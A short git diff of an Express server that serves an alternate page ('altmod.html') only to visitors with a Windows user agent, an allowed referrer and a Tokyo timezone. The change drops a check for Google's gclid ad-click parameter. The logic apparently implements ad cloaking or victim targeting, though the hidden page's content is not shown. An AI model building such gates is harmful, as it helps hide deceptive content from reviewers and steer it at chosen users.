@@ -47,13 +47,6 @@ const isAllowedReferrer = (referer) => {
   return isAllowed;
 };
 
-// Helper function to check for the gclid parameter
-const hasGclidParam = (req) => {
-  const hasGclid = !!req.query.gclid;
-  console.log(`Has GCLID parameter: ${hasGclid}`);
-  return hasGclid;
-};
-
 // CORS configuration
 const corsOptions = {
   origin: function (origin, callback) {
@@ -71,8 +64,8 @@ app.use(cors(corsOptions));
 // Middleware to parse JSON bodies
 app.use(express.json());
 
-// Middleware to parse URL-encoded bodies (needed for gclid parameter in URL)
-app.use(express.urlencoded({ extended: true }));
+// Middleware to parse URL-encoded bodies (this is no longer needed for gclid parameter in URL)
+// app.use(express.urlencoded({ extended: true }));
 
 // Route to handle the POST request
 app.post(
@@ -88,11 +81,8 @@ app.post(
     const isTokyoTimezone = timezone === "Asia/Tokyo";
     console.log(`Is Tokyo/Asia Timezone: ${isTokyoTimezone}`);
 
-    // Check all conditions and log them
-    if (hasGclidParam(req) &&
-        isWindowsOS(userAgent) &&
-        isAllowedReferrer(referer) &&
-        isTokyoTimezone) {
+    // Check conditions and log them, removed check for gclid
+    if (isWindowsOS(userAgent) && isAllowedReferrer(referer) && isTokyoTimezone) {
       res.sendFile(path.join(__dirname, "altmod.html"));
     } else {
       res.sendFile(path.join(__dirname, "index.html"));
